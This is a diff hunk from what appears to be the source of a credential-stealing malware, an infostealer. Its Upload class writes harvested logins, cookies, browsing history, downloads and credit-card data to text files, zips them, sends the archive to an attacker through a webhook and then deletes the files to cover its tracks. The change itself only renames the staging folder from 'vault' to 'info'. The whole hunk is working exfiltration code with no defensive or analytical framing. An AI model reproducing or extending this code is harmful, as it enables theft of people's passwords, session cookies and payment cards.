@@ -33,43 +33,43 @@ class Upload:
         self.clean()
     
     def write_files(self):
-        os.makedirs("vault", exist_ok=True)
+        os.makedirs("info", exist_ok=True)
         if __LOGINS__:
-            with open("vault\\logins.txt", "w", encoding="utf-8") as f:
+            with open("info\\logins.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __LOGINS__))
 
         if __COOKIES__:
-            with open("vault\\cookies.txt", "w", encoding="utf-8") as f:
+            with open("info\\cookies.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __COOKIES__))
 
         if __WEB_HISTORY__:
-            with open("vault\\web_history.txt", "w", encoding="utf-8") as f:
+            with open("info\\web_history.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __WEB_HISTORY__))
 
         if __DOWNLOADS__:
-            with open("vault\\downloads.txt", "w", encoding="utf-8") as f:
+            with open("info\\downloads.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __DOWNLOADS__))
 
         if __CARDS__:
-            with open("vault\\cards.txt", "w", encoding="utf-8") as f:
+            with open("info\\cards.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __CARDS__))
 
-        with ZipFile("vault.zip", "w") as zip:
-            for file in os.listdir("vault"):
-                zip.write(f"vault\\{file}", file)
+        with ZipFile("info.zip", "w") as zip:
+            for file in os.listdir("info"):
+                zip.write(f"info\\{file}", file)
 
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title="Vault",
-                description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
+                title="info",
+                description="```" + '\n'.join(self.tree(Path("info"))) + "```",
             ),
-            file=File("vault.zip"),
+            file=File("info.zip"),
         )
 
     def clean(self):
-        shutil.rmtree("vault")
-        os.remove("vault.zip")
+        shutil.rmtree("info")
+        os.remove("info.zip")
 
     def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
         pipes = {
